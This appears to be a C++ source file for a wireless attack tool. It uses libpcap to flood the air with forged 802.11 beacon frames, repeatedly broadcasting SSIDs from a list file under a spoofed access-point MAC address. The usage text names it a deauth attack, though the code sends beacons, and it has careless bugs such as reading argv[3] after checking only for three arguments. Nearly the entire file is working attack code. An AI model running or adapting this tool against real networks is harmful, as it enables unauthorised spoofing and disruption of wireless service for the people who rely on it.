#include <stdio.h>
#include <pcap.h>
#include <unistd.h>
#include <stdint.h>
#include <iostream>
#include<string>
#include "header.h"
using namespace std;
void usage() {
    printf("syntax : deauth-attack <interface> <ap mac> <filename>\n");
    printf("sample : deauth-attack wlan1 70:5D:CC:04:2B:A2 ssid-list.txt\n");
}
void send_deauth(pcap_t* handle, Mac ap, Mac st,char ssidlist[][40], int len){
    char ssid[40];
    u_char supported_data_rates[8]={0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c};
    u_char currentch[1]={0x0c};
    static int count=0;
    strcpy(ssid,ssidlist[count++]);
    if(ssid[strlen(ssid)-1]=='\n'){
        ssid[strlen(ssid)-1]=0;
    }
    count=count%len;
    int totallen=sizeof(radiotap_header)+sizeof(ieeeheader)+6+strlen(ssid)+sizeof(supported_data_rates)/sizeof(u_char)+sizeof(currentch)/sizeof(u_char);
    frame packet=frame(ap,st);
    Taggedparameter ssidparameter=Taggedparameter(0,strlen(ssid),(u_char*)ssid);
    Taggedparameter supportedrates=Taggedparameter(1,sizeof(supported_data_rates)/sizeof(u_char),supported_data_rates);
    Taggedparameter dsparameter=Taggedparameter(3,sizeof(currentch)/sizeof(u_char),currentch);
    memcpy(packet.tagged_parameter_area,&ssidparameter,2+strlen(ssid));
    memcpy(packet.tagged_parameter_area+2+strlen(ssid),&supportedrates,2+sizeof(supported_data_rates)/sizeof(u_char));
    memcpy(packet.tagged_parameter_area+4+strlen(ssid)+sizeof(supported_data_rates)/sizeof(u_char),
    &dsparameter,2+sizeof(currentch)/sizeof(u_char));
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), totallen); 
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
    cout<<"[INFO] Beacon!! from "<<string(ap)<<" to "<<string(st)<<" ["<<count<<"] "<<string(ssid)<<endl;
}
int main(int argc, char* argv[]) {
    char* line;
    int linecount=0;
    char buffer[40];
    Mac ap;
    Mac st;
    if (argc < 3) {
        usage();
        return -1;
    }
    else{
        ap=Mac(string(argv[2]));
        st=Mac("ff:ff:ff:ff:ff:ff");
    }
    char* dev = argv[1];
    char ssidlist[100][40];
    FILE* fp=fopen(argv[3],"rt");
    if(fp==NULL){
        printf("%s open failure\n",argv[3]);
        exit(1);
    }
    while(!feof(fp)){
        line = fgets(buffer,sizeof(buffer),fp);
        memcpy(ssidlist[linecount++],line,strlen(line)+1);
    }
	fclose(fp);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
        return -1;
    }
    while (true) {
        send_deauth(handle, ap,st,ssidlist, linecount);
        usleep(int(100000/linecount));
    }
    pcap_close(handle);
}
